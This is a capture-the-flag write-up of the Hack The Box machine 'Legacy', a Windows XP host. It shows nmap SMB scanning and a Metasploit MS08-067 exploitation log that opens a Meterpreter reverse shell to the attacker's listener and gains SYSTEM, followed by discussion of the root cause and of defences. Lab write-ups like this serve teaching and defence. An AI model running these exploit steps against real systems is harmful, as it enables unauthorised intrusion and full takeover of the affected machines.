---
title: 'Legacy'
target: 'Hack The Box — Legacy'
difficulty: 'easy'
date: 2025-09-15
summary: 'An HTB machine — Windows XP SP3 with SMB vulnerable to both MS17-010 and MS08-067. EternalBlue fails on 32-bit XP, so MS08-067 (Server service buffer overflow) provides immediate SYSTEM access via Metasploit.'
role: 'pentest'
tags: ['nmap', 'smb', 'windows-xp', 'ms08-067', 'ms17-010', 'metasploit', 'meterpreter', 'buffer-overflow', 'rpc']
problem: 'Windows XP SP3 with MSRPC (135), NetBIOS (139), and SMB (445). Vulnerable to MS17-010 and MS08-067, but EternalBlue fails on 32-bit XP. MS08-067 is a buffer overflow in netapi32.dll allowing RCE via crafted RPC requests, and the service runs as SYSTEM.'
action: 'Nmap full port scan found MSRPC (135), NetBIOS (139), and SMB (445) on Windows XP. SMB vulnerability scripts (--script=smb-vuln*) flagged both MS17-010 and MS08-067. MS17-010 failed on 32-bit XP. Exploited MS08-067 via Metasploit ms08_067_netapi — auto-fingerprinted as Windows XP SP3 English, delivered Meterpreter, returned NT AUTHORITY\SYSTEM.'
outcome: 'Immediate SYSTEM via MS08-067 after MS17-010 proved incompatible with 32-bit XP. No privilege escalation needed — the vulnerable service runs as SYSTEM.'
draft: false
---

## Background

Legacy is an easy-rated Windows XP machine and one of the earliest boxes on HackTheBox. It's about as direct as a machine gets — three ports, a known vulnerability, a Metasploit module, and immediate SYSTEM access. There's no web application to enumerate, no credential hunting, and no privilege escalation chain. The value is in understanding why MS08-067 works the way it does, why the exploit lands at SYSTEM rather than as a regular user, and why machines like this still matter as a concept even though Windows XP is long past end of life.

---

## Enumeration

A full port scan against the target reveals three open ports — the standard Windows SMB/RPC stack:

```
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

A targeted service version scan against these ports identifies the operating system:

```
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP
```

**Windows XP.** The TTL of 127 (one hop from 128) already suggested Windows, and the service fingerprint confirms it. With only SMB-related ports open and an end-of-life operating system, the next step is checking for known SMB vulnerabilities.

---

## SMB vulnerability scanning

Nmap's SMB vulnerability scripts provide a fast way to check for the most critical Windows SMB exploits:

```bash
nmap --script=smb-vuln* 10.10.10.4
```

```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
[SNIP]
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed
| smb-vuln-ms08-067:
|   VULNERABLE:
[SNIP]
```

The machine is flagged as vulnerable to two critical SMB exploits — **MS17-010** (EternalBlue) and **MS08-067**. MS10-054 and MS10-061 are ruled out. EternalBlue is the more famous of the two, but attempting it (at least with Metasploit) fails against this target — the exploit doesn't support 32-bit Windows XP. That leaves MS08-067.

---

## MS08-067 — exploitation

MS08-067 is a buffer overflow vulnerability in the Windows Server service (`netapi32.dll`), specifically in the path canonicalization code for NetBIOS file paths. The vulnerability is triggered by sending a specially crafted RPC request to the Server service over SMB. It's historically significant — the Conficker worm exploited this vulnerability to infect millions of machines in 2008-2009, making it one of the most impactful Windows vulnerabilities ever disclosed.

The critical detail about MS08-067 is that the Server service runs as `NT AUTHORITY\SYSTEM`. This means a successful exploit doesn't land in a user context that needs escalation — it lands directly at the highest privilege level on the machine.

Launching the exploit in Metasploit:

```
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.16.2:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.4:1033)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The module automatically fingerprints the target as Windows XP SP3 English, selects the appropriate target configuration (AlwaysOn NX), triggers the buffer overflow, and delivers the Meterpreter payload. `getuid` confirms **NT AUTHORITY\SYSTEM** — full control of the machine. Both flags were retrieved.

---

## What I took from this

Legacy is a one-step machine, but the underlying vulnerability is worth understanding beyond just running the Metasploit module. MS08-067 targets a flaw in how the Server service processes path canonicalization requests — specifically, it fails to properly validate the length of crafted path strings in NetBIOS requests, allowing an attacker to overflow a stack buffer and redirect execution. The reason the exploit grants SYSTEM access immediately (rather than landing as an unprivileged user like most web application exploits) is because the Server service itself runs in the SYSTEM context. This is a recurring pattern with service-level exploits on Windows — any vulnerability in a service running as SYSTEM (LSASS, Server, Spooler, WMI) skips the entire privilege escalation phase.

The EternalBlue vs. MS08-067 choice on this box is a practical reminder that exploit compatibility matters. Both vulnerabilities target SMB, both are remote code execution, and both are flagged as VULNERABLE by nmap's scripts. But EternalBlue's Metasploit implementation targets 64-bit Windows, and this machine runs 32-bit XP — a detail that only becomes apparent when the exploit fails. Checking architecture before running an exploit (through service fingerprinting, OS detection, or the exploit's own target list) saves time and avoids the false conclusion that the machine isn't exploitable.

Machines like Legacy also serve as a reminder that end-of-life systems don't disappear from real networks just because they're unsupported. Industrial control systems, medical devices, embedded systems, and legacy internal applications still run Windows XP (and older) in production environments. The defenses against vulnerabilities like MS08-067 in those environments aren't patches — they're network segmentation, firewall rules blocking SMB from untrusted networks, and monitoring for the specific RPC patterns that these exploits generate.
